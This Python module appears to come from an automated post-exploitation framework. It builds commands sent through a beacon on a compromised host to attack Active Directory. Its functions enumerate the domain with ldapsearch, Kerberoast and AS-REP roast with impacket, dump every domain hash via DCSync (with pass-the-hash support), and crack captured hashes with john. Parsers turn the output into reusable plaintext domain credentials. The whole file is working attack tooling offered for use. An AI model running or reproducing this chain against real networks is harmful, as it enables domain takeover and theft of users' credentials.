"""
ad.py — Active Directory capabilities (enumeration and attack paths).

These commands run through the established beacon channel on the TARGET
host, so they see the domain from inside the compromised machine:
  - ad_enum:     domain discovery (domain, DC, naming contexts) via
                 ldapsearch;
  - kerberoast:  request TGS tickets for SPN accounts (impacket
                 GetUserSPNs.py) — offline-crackable AD credentials;
  - as_rep_roast: request AS-REP for accounts without pre-authentication
                 (impacket GetNPUsers.py) — offline-crackable AD creds;
  - dc_sync:     replicate NTLM hashes from the DC (impacket
                 secretsdump.py -just-dc) — requires SYSTEM on the DC;
  - hash_crack:  crack a captured AD hash offline (john) — the hash is a
                 kerberoast / AS-REP / DCSync result from the WorldModel.

Findings: ad_domain (enumeration), ad_creds (hash capture), cracked
(cracked hash → plaintext credential), creds (reusable domain creds).
"""

from __future__ import annotations

import re
from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel

_IS_NTLM = re.compile(r"^[0-9a-fA-F]{32}$")


def resolve_dc(domain: str) -> str:
    """Best-effort domain-controller discovery for a domain name.

    The DC is found through the LDAP SRV record (_ldap._tcp.dc._msdcs.<domain>);
    falls back to the domain's own A record (common in flat AD deployments).
    Offline-safe and fast: any failure (no network, NXDOMAIN, missing module)
    returns "" so callers fall back to the compromised host.
    """
    domain = (domain or "").strip().rstrip(".")
    if not domain:
        return ""
    try:
        import dns.resolver
        answers = dns.resolver.resolve(
            f"_ldap._tcp.dc._msdcs.{domain}", "SRV",
            lifetime=1.0, search=False)
        for a in answers:
            target = str(a.target).rstrip(".")
            if target:
                return target
    except Exception:
        pass
    try:
        import socket
        return socket.gethostbyname(domain)
    except Exception:
        return ""


def ad_enum_command(domain: str = "", host: str = "127.0.0.1") -> str:
    base = host if host and host != "127.0.0.1" else "127.0.0.1"
    if domain:
        return (f"ldapsearch -x -H ldap://{base} -s base namingContexts "
                f"&& echo AD_ENUM_OK domain={domain}")
    return (f"ldapsearch -x -H ldap://{base} -s base namingContexts "
            f"&& echo AD_ENUM_OK")


def ad_enum_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    if "AD_ENUM_OK" not in output:
        return []
    domain = slots.get("domain", "")
    if not domain:
        # the beacon output often carries the domain in the namingContexts
        for line in output.splitlines():
            low = line.lower()
            if "dc=" in low:
                parts = re.findall(r"DC=([^,\s]+)", low, re.IGNORECASE)
                if parts:
                    domain = ".".join(parts)
                    break
    if not domain:
        return []
    # the domain controller is a DIFFERENT machine than the compromised
    # host in almost every real AD — resolve it so kerberoast / as_rep /
    # dc_sync aim at the DC instead of the foothold box.
    dc_host = ""
    for line in output.splitlines():
        if line.startswith("DC_HOST="):
            dc_host = line[len("DC_HOST="):].strip().rstrip(".")
            break
    if not dc_host:
        dc_host = resolve_dc(domain)
    return [Finding(kind="ad_domain", key=domain,
                    value={"domain": domain, "host": slots.get("host", ""),
                           "dc_host": dc_host},
                    confidence=0.9, source="ad_enum",
                    evidence=output.strip()[:200])]


def kerberoast_command(domain: str, username: str, password: str, host: str = "127.0.0.1") -> str:
    dc = host if host and host != "127.0.0.1" else domain
    return (f"GetUserSPNs.py -dc-ip {dc} -request "
            f"{domain}/{username}:{password} && echo KERBEROAST_OK")


def kerberoast_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    if "KERBEROAST_OK" not in output and "$krb5tgs$" not in output:
        return []
    hashes = [ln for ln in output.splitlines() if "$krb5tgs$" in ln]
    key = "hash"
    count = len(hashes)
    if count == 0:
        # marker only: a successful run without extractable hashes
        return [Finding(kind="ad_creds", key="spn_requested",
                        value={"domain": slots.get("domain", ""), "count": 0},
                        confidence=0.6, source="kerberoast",
                        evidence=output.strip()[:200])]
    return [Finding(kind="ad_creds", key=key,
                    value={"domain": slots.get("domain", ""), "count": count,
                           "hash": hashes[0][:400]},
                    confidence=0.95, source="kerberoast",
                    evidence=output.strip()[:200])]


def as_rep_roast_command(domain: str, username: str, password: str,
                         host: str = "127.0.0.1") -> str:
    """AS-REP roasting: request tickets for accounts with Kerberos
    pre-authentication disabled (impacket GetNPUsers.py)."""
    dc = host if host and host != "127.0.0.1" else domain
    return (f"GetNPUsers.py -dc-ip {dc} -request "
            f"{domain}/{username}:{password} && echo ASREP_ROAST_OK")


def as_rep_interpreter(output: str, wm: WorldModel,
                       slots: Dict[str, Any]) -> List[Finding]:
    if "ASREP_ROAST_OK" not in output and "$krb5asrep$" not in output:
        return []
    hashes = [ln for ln in output.splitlines() if "$krb5asrep$" in ln]
    if not hashes:
        return [Finding(kind="ad_creds", key="asrep_requested",
                        value={"domain": slots.get("domain", ""), "count": 0},
                        confidence=0.6, source="as_rep_roast",
                        evidence=output.strip()[:200])]
    return [Finding(kind="ad_creds", key="hash",
                    value={"domain": slots.get("domain", ""),
                           "count": len(hashes), "hash": hashes[0][:400]},
                    confidence=0.95, source="as_rep_roast",
                    evidence=output.strip()[:200])]


def dc_sync_command(domain: str, username: str, password: str,
                    host: str = "127.0.0.1") -> str:
    """DCSync: replicate credential hashes from the DC (impacket
    secretsdump.py -just-dc). Requires SYSTEM privileges on the beacon."""
    dc = host if host and host != "127.0.0.1" else domain
    auth = f"{domain}/{username}"
    if _IS_NTLM.match(password):
        cred = f"{auth}@{dc}"
        cmd = f"secretsdump.py -just-dc {cred} -hashes :{password}"
    else:
        cmd = f"secretsdump.py -just-dc {auth}:{password}@{dc}"
    return f"{cmd} && echo DCSYNC_OK"


def dc_sync_interpreter(output: str, wm: WorldModel,
                        slots: Dict[str, Any]) -> List[Finding]:
    if "DCSYNC_OK" not in output:
        return []
    # secretsdump -just-dc lines: domain\user:rid:lmhash:nthash:::
    hashes = [ln for ln in output.splitlines()
              if re.match(r"^[^:]+:[^:]*:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:", ln)]
    if not hashes:
        return [Finding(kind="ad_creds", key="dc_hashes",
                        value={"domain": slots.get("domain", ""), "count": 0},
                        confidence=0.6, source="dc_sync",
                        evidence=output.strip()[:200])]
    return [Finding(kind="ad_creds", key="dc_hashes",
                    value={"domain": slots.get("domain", ""),
                           "count": len(hashes), "hash": hashes[0][:400],
                           "privileged": True},
                    confidence=0.95, source="dc_sync",
                    evidence=output.strip()[:200])]


def hash_crack_command(hash_val: str,
                       wordlist: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """Crack a captured AD hash offline with john. Format is detected from
    the hash: krb5tgs (Kerberoast), krb5asrep (AS-REP roast) or nt (DCSync
    NTLM). The plaintext comes back through john --show."""
    if _IS_NTLM.match(hash_val.strip()):
        fmt = "nt"
    elif "$krb5asrep$" in hash_val:
        fmt = "krb5asrep"
    else:
        fmt = "krb5tgs"
    return (f"echo '{hash_val}' > /tmp/.ph_hash && "
            f"john --format={fmt} --wordlist={wordlist} /tmp/.ph_hash "
            f"2>/dev/null; john --show --format={fmt} /tmp/.ph_hash "
            f"&& echo HASH_CRACK_OK")


def hash_crack_interpreter(output: str, wm: WorldModel,
                           slots: Dict[str, Any]) -> List[Finding]:
    if "HASH_CRACK_OK" not in output:
        return []
    findings: List[Finding] = []
    # john --show lines: <user>:<password>[:rest]
    for line in output.splitlines():
        m = re.match(r"^([^:]+):([^:]+)(?::|$)", line.strip())
        if not m or m.group(2) in ("?", "0", "-1"):
            continue
        user, password = m.group(1), m.group(2)
        findings.append(Finding(
            kind="cracked", key=slots.get("hash", "hash")[:16],
            value={"username": user, "password": password,
                   "hash": slots.get("hash", "")},
            confidence=0.95, source="hash_crack",
            evidence=line.strip()[:200]))
        findings.append(Finding(
            kind="creds", key=f"domain:{user}",
            value={"username": user, "password": password,
                   "valid": True, "service": "domain",
                   "domain": slots.get("domain", "")},
            confidence=0.95, source="hash_crack",
            evidence=line.strip()[:200]))
    return findings
